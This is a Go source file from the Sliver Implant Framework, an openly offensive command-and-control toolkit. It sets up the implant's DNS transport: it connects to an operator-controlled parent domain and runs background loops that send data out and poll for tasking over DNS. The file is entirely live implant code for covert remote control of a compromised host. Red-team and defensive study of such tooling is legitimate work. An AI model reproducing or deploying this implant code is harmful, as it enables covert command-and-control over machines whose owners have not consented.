package dnsclient

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"net/url"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// SetupConnectionDNS - Wraps a DNS client session into a logical Connection stream
func SetupConnectionDNS(uri *url.URL, c2 *sliverpb.C2Profile) (*transports.Connection, error) {
	dnsParent := uri.Hostname()
	// {{if .Config.Debug}}
	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
	// {{end}}
	sessionID, sessionKey, err := DnsConnect(dnsParent)
	if err != nil {
		return nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("Starting new session with id = %s\n", sessionID)
	// {{end}}

	connection := transports.NewConnection()

	go func() {
		defer connection.Cleanup()
		for envelope := range connection.Send {
			SendEnvelope(dnsParent, sessionID, sessionKey, envelope)
		}
	}()

	pollTimeout := time.Duration(int(c2.PollTimeout))
	go func() {
		defer connection.Cleanup()
		Poll(dnsParent, sessionID, sessionKey, pollTimeout, connection.Done, connection.Recv)
	}()

	return connection, nil
}
